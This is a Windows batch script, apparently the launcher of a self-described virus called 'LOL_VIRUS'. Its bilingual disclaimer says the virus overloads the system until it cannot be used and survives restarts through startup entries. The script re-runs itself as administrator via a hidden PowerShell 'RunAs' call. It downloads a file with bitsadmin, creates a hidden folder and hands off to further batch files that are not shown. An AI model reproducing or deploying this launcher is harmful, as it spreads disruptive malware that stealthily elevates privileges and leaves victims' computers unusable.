@echo off
call :Adm
chcp 866
color e
ver | find "5.0" >nul && exit
ver | find "5.1" >nul && exit
ver | find "6.0" >nul && exit
cls
goto disclaimer

:disclaimer
title Disclaimer!..
echo Disclaimer! / Дисклеймер!
echo.
echo En: LOL_VIRUS is a virus that can load your system to the point where you can't use it.
echo     Restarting your computer will not help you, since this virus is written to startup.
echo.
echo Ru: LOL_VIRUS, это вирус который может нагрузить вашу систему до того, что вы не сможете ей пользоваться. 
echo     Перезагрузка компьютера вам не поможет так как этот вирус прописывается в автозагрузку. 
title Press any key to continue...
echo.
echo.
echo Нажмите любую клавишу для продолжения / Press any key to continue
pause >nul
goto qe

:qe
cls
title Connection...
echo En: Are you connected to the internet? (y/n)
echo Ru: Вы подключены к Интернету? (y/n)

echo.
Set /p choice="Choice / Выбор: "
if not defined choice goto qe
if "%choice%"=="y" (goto ce)
if "%choice%"=="n" (goto nc)
cls
goto qe

:ce
cls
title Please wait...
echo Please wait...
bitsadmin /transfer "GGYT" https://raw.githubusercontent.com/GGYT1/LOL_VIRUS/master/files/art.txt C:\LOL_VIRUS\files\art.txt >nul
mkdir C:\tmp_lolvirus
attrib +h C:\tmp_lolvirus
cls
goto nc

:nc
cls
goto c

:c
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo ver 2.5
echo.
title Choose language...
echo Please select a language
echo.
echo.
echo 1 - English
echo 2 - Русский
echo 3 - Украiнський
echo 4 - Polski

echo.
Set /p choice="Choice: "
if not defined choice goto c
if "%choice%"=="1" (goto en)
if "%choice%"=="2" (goto ru)
if "%choice%"=="3" (goto ukr)
if "%choice%"=="4" (goto pol)
cls
goto c

:ru
cls
cd C:\LOL_VIRUS\files\languages\ru
start ru.bat
cls
exit

:en
cls
cd C:\LOL_VIRUS\files\languages\en
start en.bat
cls
exit

:ukr
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo Ця мова ще не готова. Вибачте.
pause
goto c

:pol
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo Ten jezyk nie jest jeszcze gotowy. Przepraszam.
pause
goto c

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)
